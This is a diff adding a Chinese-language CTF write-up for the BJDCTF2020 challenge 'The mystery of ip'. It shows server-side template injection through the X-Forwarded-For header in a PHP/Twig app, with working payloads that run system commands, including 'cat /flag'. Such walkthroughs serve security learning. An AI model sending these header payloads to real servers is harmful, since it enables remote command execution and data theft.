@@ -12,3 +12,35 @@
 
     ![](https://s21.ax1x.com/2024/04/06/pFqsgN6.png)
 5. 得到flag
+
+# [BJDCTF2020]The mystery of ip 1
+
+## 考点
+X-Forwarded-For注入
+
+PHP可能存在Twig模版注入漏洞
+
+## WP
+
+结合题目名，IP的秘密，flag页面也出现了IP，猜测为X-Forwarded-For处有问题
+
+使用BurpSuite抓取数据包
+
+添加HTTP请求头`X-Forwarded-For: 1`
+
+发送数据包，得到回显页面Your IP is : 1
+
+被成功执行，说明XFF可控
+
+>Flask可能存在Jinjia2模版注入漏洞
+>PHP可能存在Twig模版注入漏洞
+
+添加模版算式，检测其是否可被执行`X-Forwarded-For: {{7*7}}`
+
+得到回显页面Your IP is : 49	
+
+模版中算式被成功执行，尝试是否能执行命令`X-Forwarded-For: {{system('ls')}}`
+
+命令可以被成功执行，查找flag的位置`X-Forwarded-For: {{system('ls /')}}`
+
+在/目录下查找到flag，读取flag，构造payload`X-Forwarded-For: {{system('cat /flag')}}`
